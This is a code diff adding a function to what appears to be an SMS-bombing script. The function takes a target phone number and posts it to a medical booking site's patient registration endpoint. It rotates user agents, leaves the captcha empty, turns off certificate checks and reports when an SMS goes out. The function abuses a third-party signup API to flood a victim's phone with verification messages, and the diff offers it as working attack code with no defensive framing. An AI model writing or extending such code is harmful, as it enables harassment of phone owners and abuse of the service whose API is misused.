@@ -221,6 +221,46 @@ def snapp(phone):
         return False
 
 
+def drto(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json", 
+            "app-version": "2.0.0",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "country_id": 205,
+            "captcha": ""
+        }
+        
+        response = requests.post(
+            "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] drto Status: {response.status_code}{a}')
+        print(f'{y}[Debug] drto Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(drto) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] drto error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] drto exception: {e}{a}')
+        return False
+
+
 # ==========================
 # لیست سرویس‌ها
 # =======================
